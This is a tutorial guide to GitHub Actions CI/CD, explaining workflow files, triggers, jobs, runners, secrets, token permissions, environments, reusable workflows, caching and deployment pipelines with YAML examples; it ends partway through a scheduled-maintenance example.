---
title: "GitHub Actions"
layout: guide
category: Developer Tools
subcategory: GitHub
description: "CI/CD automation with GitHub Actions: workflow syntax, triggers and filters, jobs, matrices, and concurrency, actions and runners, secrets, GITHUB_TOKEN permissions, environments, reusable workflows, artifacts and caching, common pipelines, security hardening including OIDC and script injection, and cost."
tags: [practical, github-actions, cicd, workflows, runners, oidc, supply-chain]
---
{% raw %}

## What GitHub Actions Is

[GitHub Actions](https://docs.github.com/en/actions){:target="_blank" rel="noopener noreferrer"} is an event-driven automation platform built directly into GitHub. When something happens in your repository (a push, a pull request, a scheduled timer, or a manual trigger), GitHub Actions can execute arbitrary automation in response. The most common use is CI/CD: automatically building, testing, and deploying your code. But GitHub Actions handles much more than that, including dependency updates, release automation, issue triage, security scanning, and any other task you'd otherwise run manually or with a separate orchestration system.

The platform is tightly integrated with GitHub's data model. Workflows live inside your repository, run in response to repository events, and produce results you see alongside your pull requests and commits. There's no separate server to operate and no pipeline definition to maintain in a different tool.

For broader CI/CD concepts like the philosophy behind pipeline design, testing strategies, and delivery principles, see the [CI/CD guide](/study-guides/sdlc/cicd.html).

## Core Concepts

GitHub Actions is built around six concepts that compose into a complete automation system.

A **workflow** is an automated process defined in a YAML file. Workflows live in `.github/workflows/` in your repository. You can have as many workflow files as you need: one for CI, one for deployments, one for scheduled tasks.

An **event** is what triggers a workflow. Events correspond to things that happen in GitHub: pushes, pull requests, releases, scheduled times, manual triggers, and more. A workflow defines which events activate it.

**Jobs** are the units of work inside a workflow. Each job runs on a separate machine and executes a sequence of steps. Jobs run in parallel by default, and the `needs` keyword makes one job wait for another.

**Steps** are the individual commands or actions within a job. Steps run sequentially and share the same machine and filesystem. A step either runs a shell command directly or invokes a pre-built action.

**Actions** are reusable building blocks, packaged scripts that perform a specific task. The [GitHub Marketplace](https://github.com/marketplace?type=actions){:target="_blank" rel="noopener noreferrer"} hosts thousands of community and vendor actions. You can also write your own.

**Runners** are the machines that execute your jobs. GitHub provides hosted runners (Ubuntu, Windows, macOS), or you can bring your own self-hosted runners for more control.

These six concepts compose into a hierarchy: an event fires a workflow, the workflow contains jobs, each job runs on a separate runner, and each job contains steps that execute sequentially on that runner.

```
  Event (push to main)
  │
  └─► Workflow (.github/workflows/ci.yml)
      │
      ├─► Job: build                    ┐
      │   ├─► Step 1: Checkout code     │  Runs on
      │   ├─► Step 2: Setup .NET        │  Runner 1
      │   └─► Step 3: Build             │  (ubuntu-latest)
      │                                 ┘
      │       needs: build
      │           │
      ├─► Job: test                     ┐
      │   ├─► Step 1: Checkout code     │  Runs on
      │   ├─► Step 2: Run tests         │  Runner 2
      │   └─► Step 3: Upload results    │  (ubuntu-latest)
      │                                 ┘
      │       needs: test
      │           │
      └─► Job: deploy                   ┐
          ├─► Step 1: Download artifact │  Runs on
          └─► Step 2: Deploy to staging │  Runner 3
                                        ┘

  Jobs run on separate runners (separate machines).
  Steps within a job run sequentially on the same runner.
  Jobs run in parallel unless linked by "needs".
```

## Workflow File Structure

Every workflow is a YAML file in `.github/workflows/`. The filename can be anything descriptive like `ci.yml`, `deploy.yml`, or `release.yml`. The UI displays the workflow's `name` field, falling back to the file path when `name` is omitted.

Here's a complete, realistic CI workflow to illustrate the structure:

```yaml
name: CI

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

env:
  DOTNET_VERSION: "10.0.x"

jobs:
  build-and-test:
    name: Build and Test
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v7

      - name: Set up .NET
        uses: actions/setup-dotnet@v6
        with:
          dotnet-version: ${{ env.DOTNET_VERSION }}

      - name: Restore dependencies
        run: dotnet restore

      - name: Build
        run: dotnet build --no-restore --configuration Release

      - name: Run tests
        run: dotnet test --no-build --configuration Release --logger trx

      - name: Upload test results
        uses: actions/upload-artifact@v7
        if: always()
        with:
          name: test-results
          path: "**/*.trx"
```

The top-level keys are:

- `name`: Display name shown in the GitHub UI
- `on`: The event trigger configuration
- `env`: Environment variables available to all jobs
- `jobs`: The collection of jobs to run

Inside each job:

- `runs-on`: Which runner type to use
- `steps`: Ordered list of steps
- `name` (on a step): Display label in workflow logs
- `uses`: References a pre-built action
- `run`: Executes a shell command
- `with`: Passes inputs to an action
- `if`: Conditionally runs a step

## Events and Triggers

The `on:` key defines what activates a workflow. You can specify a single event, a list of events, or a map of events with filtering options.

### Common Events

| Event | When it fires |
|---|---|
| `push` | On any push to a branch or tag |
| `pull_request` | On PR activity. By default only when a PR is opened, gets new commits (`synchronize`), or is reopened |
| `pull_request_target` | On PR activity, but runs the default branch's workflow with access to secrets and a write-capable token (see Security Considerations) |
| `merge_group` | When a PR enters a merge queue. Required checks must also run on this event, or queued PRs never merge |
| `workflow_dispatch` | Manual trigger via the GitHub UI or API |
| `schedule` | On a cron schedule |
| `release` | When a GitHub Release is created, published, or updated |
| `workflow_call` | Called by another workflow (makes this workflow reusable) |
| `repository_dispatch` | A REST API call from an external system |
| `workflow_run` | Triggered when another workflow completes |

### Event Filtering

Most events support filters that narrow when the workflow runs. This prevents unnecessary workflow executions and keeps your CI focused.

```yaml
on:
  push:
    branches:
      - main
      - "release/**"
    paths:
      - "src/**"
      - "tests/**"
      - "!src/**/*.md"     # a leading ! excludes matches of earlier patterns
    tags:
      - "v*"

  pull_request:
    types: [opened, synchronize, reopened]
    branches:
      - main
```

`branches` and `paths` filters use glob patterns. A `paths` filter means the workflow only runs if at least one changed file matches, which is useful for monorepos where each service directory gets its own pipeline. Each filter also has an `-ignore` form (`branches-ignore`, `paths-ignore`), but an event can't use a filter and its `-ignore` form together. To include some paths and exclude others, use a single list with `!` patterns as above. Path filters are not evaluated for pushes of tags.

A workflow skipped by a path filter reports no status at all, so if that workflow is a required check, PRs that don't touch its paths wait forever for a check that never runs.

The `types` filter on `pull_request` controls which PR lifecycle events activate the workflow. By default, `pull_request` fires on `opened`, `synchronize`, and `reopened`. Adding `closed` lets you trigger cleanup on PR merge or close.

### Scheduled Triggers

Scheduled workflows use [POSIX cron syntax](https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#schedule){:target="_blank" rel="noopener noreferrer"}, evaluated in UTC. The shortest interval is every five minutes, and runs can start late, or occasionally be dropped, when GitHub is under heavy load, so avoid scheduling at the top of the hour when everyone else does.

```yaml
on:
  schedule:
    - cron: "0 2 * * 1"   # Every Monday at 2:00 AM UTC
    - cron: "0 6 * * *"   # Every day at 6:00 AM UTC
```

Scheduled workflows only run on the default branch. If you need branch-specific schedules, use `workflow_dispatch` or `repository_dispatch` triggered from an external scheduler. In public repositories, GitHub disables scheduled workflows after 60 days without repository activity.

### Manual Triggers with Inputs

`workflow_dispatch` supports typed inputs, making manual runs configurable:

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: "Target environment"
        required: true
        type: choice
        options:
          - staging
          - production
      version:
        description: "Version to deploy (e.g. v1.2.3)"
        required: true
        type: string
      dry-run:
        description: "Perform a dry run without deploying"
        required: false
        type: boolean
        default: false
```

Inputs are accessible as `${{ inputs.environment }}` throughout the workflow.

## Jobs

### Job Dependencies

By default, jobs run in parallel. Use `needs` to create sequential dependencies:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building..."

  test:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Testing..."

  deploy-staging:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying to staging..."

  deploy-production:
    needs: [test, deploy-staging]
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying to production..."
```

`needs` accepts a single job name or a list. A job only starts when all its dependencies have succeeded, unless you override that with an `if` condition such as `always()`.

### Matrix Strategies

Matrix strategies let you run a job against multiple configurations simultaneously. This is particularly useful for testing across multiple runtime versions or operating systems:

```yaml
jobs:
  test:
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        dotnet: ["8.0.x", "9.0.x", "10.0.x"]
        exclude:
          - os: macos-latest
            dotnet: "8.0.x"
        include:
          - os: ubuntu-latest
            dotnet: "10.0.x"
            experimental: true
      fail-fast: false
      max-parallel: 6

    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-dotnet@v6
        with:
          dotnet-version: ${{ matrix.dotnet }}
      - run: dotnet test
```

`exclude` removes combinations from the generated set. `include` either adds variables to combinations that already exist, as it adds `experimental: true` to the Ubuntu and .NET 10 job here, or adds whole new combinations. `fail-fast` defaults to `true`, cancelling the other combinations as soon as one fails, so setting it to `false` lets every combination finish and report. `max-parallel` limits concurrent runs to avoid overwhelming self-hosted runners or external services. A matrix can generate at most 256 jobs per workflow run.

### Conditional Execution

The `if` key evaluates an expression before deciding whether to run a job or step. GitHub Actions provides a rich expression language built around context variables:

```yaml
jobs:
  deploy:
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: ./deploy.sh

      - name: Notify on failure
        if: failure()
        run: ./notify-failure.sh

      - name: Always clean up
        if: always()
        run: ./cleanup.sh
```

The status functions `success()`, `failure()`, `cancelled()`, and `always()` control what runs after a failure. Without an explicit `if`, steps only run when all previous steps succeeded. `failure()` runs a step only when a previous step failed, and `always()` runs it regardless, even when the run was cancelled. For cleanup that shouldn't run on cancellation, `if: ${{ !cancelled() }}` is the usual choice.

### Concurrency Groups

Concurrency groups prevent multiple workflow runs from interfering with each other. This is critical for deployments, where two simultaneous runs targeting the same environment would produce unpredictable results:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

This configuration cancels any in-progress run for the same workflow and branch when a new run starts. For production deployments, you might prefer `cancel-in-progress: false` to let the current deployment finish first. A group holds at most one running and one pending run, though, so when a third run arrives it replaces the pending one, which is cancelled. That's usually what you want for deployments, since the newest commit is the one you want deployed.

You can define concurrency at the workflow level or on individual jobs, and you can compose dynamic group names from any context variables.

## Steps

### Run vs. Uses

Every step either executes a shell command (`run`) or invokes an action (`uses`). These serve different purposes.

`run` executes commands directly in the runner's shell. The default shell is `bash` on Linux and macOS runners and PowerShell (`pwsh`) on Windows. You can override it per step, or for a whole job or workflow with `defaults.run.shell`:

```yaml
steps:
  - name: Single line command
    run: echo "Hello"

  - name: Multi-line script
    run: |
      echo "Line one"
      echo "Line two"
      ./my-script.sh --flag value

  - name: PowerShell step
    shell: pwsh
    run: |
      Write-Host "Running PowerShell"
      Get-ChildItem

  - name: Python script
    shell: python
    run: |
      import os
      print(f"Running in {os.getcwd()}")
```

`uses` invokes a pre-built action. Actions are referenced as `owner/repo@ref`, where `ref` is a tag, branch, or SHA:

```yaml
steps:
  - uses: actions/checkout@v7
  - uses: actions/setup-node@v7
    with:
      node-version: "20"
```

### Working with Outputs

Steps can produce outputs that subsequent steps consume. Outputs pass through environment files rather than stdout, which makes them reliable even when commands produce noisy output:

```yaml
steps:
  - name: Generate version
    id: version
    run: |
      VERSION=$(git describe --tags --always)
      echo "tag=$VERSION" >> $GITHUB_OUTPUT

  - name: Use version
    run: echo "Deploying version ${{ steps.version.outputs.tag }}"
```

The `id` field on a step makes its outputs referenceable. The syntax `${{ steps.<id>.outputs.<name> }}` retrieves a named output from any previous step in the same job.

For passing data between jobs, outputs bubble up through job-level outputs:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.tag }}
    steps:
      - id: version
        run: echo "tag=v1.2.3" >> $GITHUB_OUTPUT

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ needs.build.outputs.version }}"
```

Job outputs are small strings meant for values like versions and flags. GitHub refuses to pass an output that contains a secret, and files belong in artifacts instead.

### Environment Variables in Steps

Steps have access to environment variables from multiple sources. GitHub provides a set of [default environment variables](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables#default-environment-variables){:target="_blank" rel="noopener noreferrer"} like `GITHUB_SHA`, `GITHUB_REF`, `GITHUB_WORKSPACE`, and `GITHUB_REPOSITORY`. You can define additional variables at the workflow, job, or step level using `env:`.

```yaml
env:
  APP_NAME: my-service

jobs:
  build:
    env:
      BUILD_CONFIG: Release
    steps:
      - name: Build
        env:
          SPECIFIC_VAR: only-this-step
        run: dotnet build --configuration $BUILD_CONFIG
```

To set a variable for all later steps in the job, append `NAME=value` to the file at `$GITHUB_ENV`. Multi-line values need a delimiter, as below:

```yaml
- name: Set multi-line env var
  run: |
    {
      echo "MY_VAR<<EOF"
      echo "line one"
      echo "line two"
      echo "EOF"
    } >> $GITHUB_ENV
```

## Actions

### Using Marketplace Actions

Actions are versioned and referenced by their GitHub repository and a ref. By convention, maintainers move a major-version tag like `@v7` to each new `v7.x.x` release, so referencing it picks up fixes without breaking changes:

```yaml
- uses: actions/checkout@v7
- uses: actions/setup-node@v7
  with:
    node-version: "20"
    cache: "npm"
```

### Pinning to SHA

For third-party actions where you don't control the release process, pin to a specific commit SHA rather than a mutable tag. A tag can be moved to point at a different commit, including by an attacker who compromises the action's repository, but a full commit SHA always refers to the same code:

```yaml
# Risky: tag can be moved
- uses: some-org/some-action@v2

# Safe: SHA is immutable
- uses: some-org/some-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
```

A common convention is to add the version as a comment after the SHA (`@a1b2c3d… # v2.4.1`), which tools like [Dependabot](https://docs.github.com/en/code-security/dependabot){:target="_blank" rel="noopener noreferrer"} read and update in their pull requests, so pinning doesn't mean falling behind. Repository, organization, and enterprise administrators can enforce the practice with an Actions policy that fails any workflow using an action not pinned to a full-length SHA.

### Composite Actions

When you have a sequence of steps you repeat across multiple workflows, wrap them in a composite action stored in your repository:

```yaml
# .github/actions/setup-environment/action.yml
name: "Setup Environment"
description: "Checks out code and configures the build environment"

inputs:
  dotnet-version:
    description: ".NET SDK version to install"
    required: false
    default: "10.0.x"

outputs:
  cache-hit:
    description: "Whether the NuGet cache was restored"
    value: ${{ steps.cache.outputs.cache-hit }}

runs:
  using: "composite"
  steps:
    - name: Checkout
      uses: actions/checkout@v7

    - name: Set up .NET
      uses: actions/setup-dotnet@v6
      with:
        dotnet-version: ${{ inputs.dotnet-version }}

    - name: Restore NuGet cache
      id: cache
      uses: actions/cache@v6
      with:
        path: ~/.nuget/packages
        key: ${{ runner.os }}-nuget-${{ hashFiles('**/*.csproj') }}
        restore-keys: ${{ runner.os }}-nuget-
```

Invoke it from any workflow in the same repository:

```yaml
- uses: $/.github/actions/setup-environment
  with:
    dotnet-version: "10.0.x"
```

The `$/` prefix resolves to the workflow's own repository at the exact commit being run, without needing a checkout first. The older `./` prefix resolves against the checked-out workspace, so it only works after an `actions/checkout` step, and it still appears in most existing workflows. Composite actions conventionally live in `.github/actions/<name>/action.yml` and reduce duplication when workflows share setup steps. An action in its own public repository can be referenced from any repository and published to the Marketplace.

## Runners

### GitHub-Hosted Runners

GitHub provides managed virtual machines that are provisioned fresh for each job and torn down afterward. The common labels, as of September 2026:

| Label | Image | Use it for |
|---|---|---|
| `ubuntu-latest` | Ubuntu 24.04 | The default for almost everything |
| `ubuntu-26.04`, `ubuntu-24.04`, `ubuntu-22.04` | Pinned Ubuntu versions | Reproducible builds that shouldn't move when `-latest` does |
| `ubuntu-24.04-arm` | Ubuntu 24.04 on Arm64 | Building or testing Arm Linux artifacts natively |
| `ubuntu-slim` | Single-CPU Linux | Lightweight jobs like labeling or notifications |
| `windows-latest` | Windows Server 2025 | .NET Framework, WinUI, and other Windows-only builds |
| `windows-2022` | Windows Server 2022 | Pinned older Windows |
| `windows-11-arm` | Windows 11 on Arm64 | Windows on Arm builds |
| `macos-latest` | macOS 26 on Apple silicon | iOS and macOS builds |
| `macos-26-intel`, `macos-15-intel` | macOS on Intel | Intel-native Mac builds |

The `-latest` labels move to a new OS version a few months after it ships, so a build that depends on a specific toolchain version should use a pinned label. Machine size depends on repository visibility. Standard Linux and Windows runners get 4 CPUs and 16 GB of RAM in public repositories and 2 CPUs and 8 GB in private ones, and larger runners with more cores or GPUs are available as a paid option. The [runner images repository](https://github.com/actions/runner-images){:target="_blank" rel="noopener noreferrer"} lists the software installed on each image.

### Self-Hosted Runners

Self-hosted runners let you bring your own machines. They're useful when:

- Your jobs need hardware that GitHub doesn't provide (specialized GPUs, specific network configurations, hardware security modules)
- You have compliance requirements preventing code from running on GitHub's infrastructure
- You need to access private network resources (internal databases, artifact registries, deployment targets)
- Your workloads are large enough that self-hosted is more cost-effective than GitHub's per-minute billing

Register a self-hosted runner at the repository, organization, or enterprise level. The runner agent is a lightweight application that polls GitHub for queued jobs. A self-hosted runner persists between jobs unless you make it ephemeral, which means your build environment accumulates state, and files or credentials left by one job are visible to the next. Either manage cleanup yourself, or use ephemeral runners that take one job and are then destroyed. [Actions Runner Controller](https://github.com/actions/actions-runner-controller){:target="_blank" rel="noopener noreferrer"} automates that pattern on Kubernetes.

Don't attach self-hosted runners to public repositories. Anyone can open a pull request against a public repository, and depending on the workflow settings, that pull request's code can end up running on your machine, inside your network.

Target self-hosted runners using labels:

```yaml
runs-on: [self-hosted, linux, x64]
```

Runner groups, at the organization and enterprise levels, restrict which repositories and workflows can use which runners, so a runner provisioned for sensitive internal workloads only takes jobs from the repositories meant to use it.

### Choosing the Right Runner

Start with `ubuntu-latest` for almost everything. Switch to Windows only when your build requires it, since Windows runners are often slower for the same work and cost more per minute. Use macOS only for Apple platform builds, given the cost differential. Add self-hosted runners only when you have a concrete reason, such as compliance, private network access, special hardware, or cost at scale.

## Secrets and Variables

### Secrets

Secrets store sensitive values like API keys, deploy credentials, and connection strings. They're encrypted at rest and masked in workflow logs, so if a secret value appears in log output, GitHub replaces it with `***`. Masking only matches the exact value, though, so a secret that has been transformed, such as base64-encoded, sliced, or JSON-escaped, can still leak into logs unmasked.

Define secrets in your repository settings, then access them in workflows through the `secrets` context:

```yaml
steps:
  - name: Deploy
    env:
      DATABASE_URL: ${{ secrets.DATABASE_URL }}
      API_KEY: ${{ secrets.DEPLOY_API_KEY }}
    run: ./deploy.sh
```

Secrets exist at three scopes, and when the same name exists at more than one, the most specific wins:

| Scope | Available to | Precedence |
|---|---|---|
| **Environment** | Only jobs that target that environment (see Environments below) | Highest |
| **Repository** | All workflows in the repository | Middle |
| **Organization** | Repositories the organization grants access to, through an allow list per secret | Lowest |

### Variables

Variables (as opposed to secrets) store non-sensitive configuration values that you want to reuse without committing to source code. They're accessible through the `vars` context:

```yaml
steps:
  - name: Build
    run: dotnet build --configuration ${{ vars.BUILD_CONFIGURATION }}
```

Variables follow the same scoping hierarchy as secrets (repository, environment, organization) but their values are visible in the GitHub UI and are not masked in logs.

### The GITHUB_TOKEN

Every job receives an automatically provisioned `GITHUB_TOKEN`, a short-lived token scoped to the repository that expires when the job finishes. It can call the GitHub API and push to the repository for actions like creating releases, commenting on pull requests, and committing generated files, within whatever permissions it has been granted.

Its default permissions come from a repository or organization setting with two options. The **restricted** default grants read access to repository contents and packages and nothing else, and it's what repositories and organizations created since early 2023 start with. The **permissive** default grants read and write access to most scopes, and older organizations may still use it. A workflow shouldn't rely on either. Declare what it needs instead:

```yaml
permissions:
  contents: read
  pull-requests: write
```

A `permissions` block can sit at the workflow level or on an individual job. Any scope it doesn't list is set to no access, so the block above also removes write access to packages, deployments, and everything else.

Two behaviors surprise people. Events caused by the `GITHUB_TOKEN`, such as a push or a new pull request, don't start new workflow runs, except for `workflow_dispatch` and `repository_dispatch`. GitHub does this to prevent workflows from triggering each other in loops, and a workflow that needs to trigger another uses a GitHub App token instead. Also, for `pull_request` events from forks, the token is read-only and repository secrets aren't passed to the workflow at all, because the forked branch's code could be malicious.

## Environments

Environments represent deployment targets like staging and production. They add protection rules and environment-scoped secrets and variables on top of the basic job model. Environments with every protection rule are available in public repositories on all plans. In private repositories, environments and branch restrictions need a paid plan (Pro, Team, or Enterprise), and required reviewers and wait timers need GitHub Enterprise.

```yaml
jobs:
  deploy-production:
    environment:
      name: production
      url: https://myapp.com
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        env:
          DEPLOY_KEY: ${{ secrets.PRODUCTION_DEPLOY_KEY }}
        run: ./deploy-prod.sh
```

Environments support several protection rules:

| Rule | Effect |
|---|---|
| **Required reviewers** | Pauses the job until one of up to six designated users or teams approves it. Can optionally stop people from approving deployments they triggered themselves |
| **Wait timer** | Delays the job by up to 30 days after it's triggered, leaving a window to cancel |
| **Deployment branches and tags** | Only runs from matching branches or tags, so the `production` environment can accept deployments from `main` and nothing else |
| **Custom protection rules** | Calls a GitHub App that approves or rejects the deployment, for checks like change management tickets or monitoring health |

Combining these rules gives you a deployment pipeline where staging is automatic but production requires a reviewer's explicit approval:

```yaml
jobs:
  deploy-staging:
    environment: staging
    # No protection rules: deploys automatically
    # (runs-on and steps omitted)

  deploy-production:
    needs: deploy-staging
    environment: production
    # Requires approval from the production-approvers team
```

## Reusable Workflows

Reusable workflows address a limitation of composite actions. Composite actions share steps, but a full workflow with its own jobs, matrix strategies, and environment configurations couldn't be shared until reusable workflows were introduced.

Define a reusable workflow with `workflow_call` as one of its triggers:

```yaml
# .github/workflows/deploy-service.yml
name: Deploy Service (Reusable)

on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
      image-tag:
        required: true
        type: string
    secrets:
      DEPLOY_TOKEN:
        required: true
    outputs:
      deployment-url:
        description: "URL of the deployed service"
        value: ${{ jobs.deploy.outputs.url }}

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    outputs:
      url: ${{ steps.deploy-step.outputs.url }}
    steps:
      - name: Deploy
        id: deploy-step
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: |
          URL=$(./deploy.sh ${{ inputs.image-tag }} ${{ inputs.environment }})
          echo "url=$URL" >> $GITHUB_OUTPUT
```

Call it from another workflow:

```yaml
# .github/workflows/release.yml
jobs:
  deploy-staging:
    uses: ./.github/workflows/deploy-service.yml
    with:
      environment: staging
      image-tag: ${{ github.sha }}
    secrets:
      DEPLOY_TOKEN: ${{ secrets.STAGING_DEPLOY_TOKEN }}

  deploy-production:
    needs: deploy-staging
    uses: ./.github/workflows/deploy-service.yml
    with:
      environment: production
      image-tag: ${{ github.sha }}
    secrets:
      DEPLOY_TOKEN: ${{ secrets.PRODUCTION_DEPLOY_TOKEN }}
```

Reusable workflows declare their inputs and secrets explicitly. The calling workflow must pass required inputs, and a secret the reusable workflow doesn't declare isn't available inside it, even if the caller has it. That makes the interface self-documenting and prevents accidental secret exposure. A caller that trusts the reusable workflow can pass everything with `secrets: inherit` instead, at the cost of that explicitness. Environment variables set with `env` in the caller are not passed through at all, which is a frequent surprise.

The calling job can't have its own steps. It is replaced by the jobs of the reusable workflow. Organizations often keep shared workflows in a central repository and reference them with `uses: org/shared-workflows/.github/workflows/deploy.yml@v1`, which requires that repository's Actions settings to allow access from the calling repositories.

## Artifacts and Caching

### Artifacts

Artifacts persist files from a workflow run so you can download them afterward or share them between jobs. They're kept for 90 days by default, adjustable per repository, and storage counts against the account's included artifact storage.

Upload from one job:

```yaml
- name: Build
  run: dotnet publish -c Release -o ./publish

- name: Upload artifact
  uses: actions/upload-artifact@v7
  with:
    name: published-app
    path: ./publish
    retention-days: 30
```

Download in a subsequent job:

```yaml
- name: Download artifact
  uses: actions/download-artifact@v8
  with:
    name: published-app
    path: ./publish

- name: Deploy
  run: ./deploy.sh ./publish
```

This pattern separates build from deploy. The build job compiles and packages, and the deploy job downloads the artifact and pushes it to the target environment. Each job runs on a fresh runner, so files have to travel between them through artifacts or an external store like a container registry.

### Caching Dependencies

The `actions/cache` action stores and restores directories between runs. Its value comes from caching dependency downloads that would otherwise repeat on every run, such as NuGet packages, npm modules, pip packages, and Go modules.

```yaml
- name: Cache NuGet packages
  uses: actions/cache@v6
  with:
    path: ~/.nuget/packages
    key: ${{ runner.os }}-nuget-${{ hashFiles('**/*.csproj', '**/*.props') }}
    restore-keys: |
      ${{ runner.os }}-nuget-

- name: Restore dependencies
  run: dotnet restore
```

The cache `key` uniquely identifies a cache entry. When the key matches exactly, the cache is restored verbatim. When there's no exact match, `restore-keys` provides fallback prefixes, and GitHub restores the most recent cache whose key starts with the prefix, giving you a warm cache even when lock files change.

A cache miss doesn't fail the job. The restore step reports the miss, the following steps download dependencies as usual, and at the end of the job, if the key is new, the directory is saved for future runs. An existing key is never overwritten, which is why the key has to change when the dependencies do. Each repository gets 10 GB of cache storage, and entries unused for seven days are evicted.

Common caching strategies:

| Language/Tool | Cache Path | Key Input |
|---|---|---|
| .NET (NuGet) | `~/.nuget/packages` | Hash of `*.csproj` files |
| Node.js (npm) | `~/.npm` | Hash of `package-lock.json` |
| Python (pip) | `~/.cache/pip` | Hash of `requirements.txt` |
| Go | `~/go/pkg/mod` | Hash of `go.sum` |
| Docker layers | Handled by BuildKit's `type=gha` cache backend (see the deployment pattern below) | Managed automatically |

Many setup actions like `actions/setup-node` and `actions/setup-dotnet` accept a `cache` input that handles all this automatically. They key the cache on a lock file, so `setup-dotnet` needs NuGet lock files (`packages.lock.json`, enabled with `RestorePackagesWithLockFile`) committed to the repository, and `setup-node` needs `package-lock.json` or its equivalent. When the lock file exists, prefer the built-in input over manual `actions/cache` configuration.

## Common Workflow Patterns

### Build and Test on Pull Requests

This is the foundational workflow: run on every PR and push to main, fail fast on broken tests, report results alongside the PR.

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-dotnet@v6
        with:
          dotnet-version: "10.0.x"
          cache: true   # requires committed packages.lock.json files

      - run: dotnet restore
      - run: dotnet build --no-restore
      - run: dotnet test --no-build --collect:"XPlat Code Coverage"

      - name: Upload coverage
        uses: codecov/codecov-action@v7
        with:
          token: ${{ secrets.CODECOV_TOKEN }}
```

### Build, Push, Deploy to Staging and Production

A complete deployment pipeline with Docker, environment protection, and staged rollout:

```yaml
name: Deploy

on:
  push:
    branches: [main]

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  build-and-push:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    outputs:
      image-tag: ${{ steps.meta.outputs.tags }}
      image-digest: ${{ steps.push.outputs.digest }}

    steps:
      - uses: actions/checkout@v7

      - name: Log in to container registry
        uses: docker/login-action@v4
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v6
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=sha,prefix=sha-

      - name: Build and push
        id: push
        uses: docker/build-push-action@v7
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy-staging:
    needs: build-and-push
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.myapp.com

    steps:
      - uses: actions/checkout@v7
      - name: Deploy to staging
        env:
          IMAGE: ${{ needs.build-and-push.outputs.image-tag }}
          KUBE_CONFIG: ${{ secrets.STAGING_KUBE_CONFIG }}
        run: |
          echo "$KUBE_CONFIG" | base64 -d > /tmp/kubeconfig
          kubectl --kubeconfig=/tmp/kubeconfig set image deployment/myapp \
            myapp=$IMAGE

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://myapp.com

    steps:
      - uses: actions/checkout@v7
      - name: Deploy to production
        env:
          IMAGE: ${{ needs.build-and-push.outputs.image-tag }}
          KUBE_CONFIG: ${{ secrets.PRODUCTION_KUBE_CONFIG }}
        run: |
          echo "$KUBE_CONFIG" | base64 -d > /tmp/kubeconfig
          kubectl --kubeconfig=/tmp/kubeconfig set image deployment/myapp \
            myapp=$IMAGE
```

The pipeline flows through three stages, with the production environment's required reviewers acting as the approval gate:

```
  Push to main
       │
       ▼
  ┌─────────────┐     ┌──────────────┐     ┌───────────────────┐     ┌───────────────────┐
  │   build &   │────►│   deploy to  │────►│  ⏸ APPROVAL GATE  │────►│   deploy to       │
  │   push      │     │   staging    │     │                   │     │   production      │
  │   image     │     │   (auto)     │     │  Reviewer must    │     │   (after approval)│
  └─────────────┘     └──────────────┘     │  approve in       │     └───────────────────┘
                                           │  GitHub UI        │
                                           └───────────────────┘
                                                  │
                                           + optional wait timer
                                           + branch restrictions
```

### Release Automation

Automate GitHub Release creation when a version tag is pushed:

```yaml
name: Release

on:
  push:
    tags:
      - "v*.*.*"

jobs:
  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-dotnet@v6
        with:
          dotnet-version: "10.0.x"

      - name: Build release artifacts
        run: |
          dotnet publish src/MyApp -c Release -r linux-x64 \
            --self-contained -o ./artifacts/linux-x64
          dotnet publish src/MyApp -c Release -r win-x64 \
            --self-contained -o ./artifacts/win-x64

      - name: Create archives
        run: |
          cd artifacts
          tar czf myapp-linux-x64.tar.gz linux-x64/
          zip -r myapp-win-x64.zip win-x64/

      - name: Create GitHub Release
        uses: softprops/action-gh-release@v3
        with:
          generate_release_notes: true
          files: |
            artifacts/myapp-linux-x64.tar.gz
            artifacts/myapp-win-x64.zip
```

### Scheduled Maintenance

Scheduled workflows handle recurring tasks like dependency audits, database cleanup, or stale issue management:

```yaml
name: Scheduled Maintenance

on:
  schedule:
    - cron: "0 3 * * 0"  # Every Sunday at 3 AM UTC
  workflow_dispatch:  # Also allow manual runs

jobs:
  dependency-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
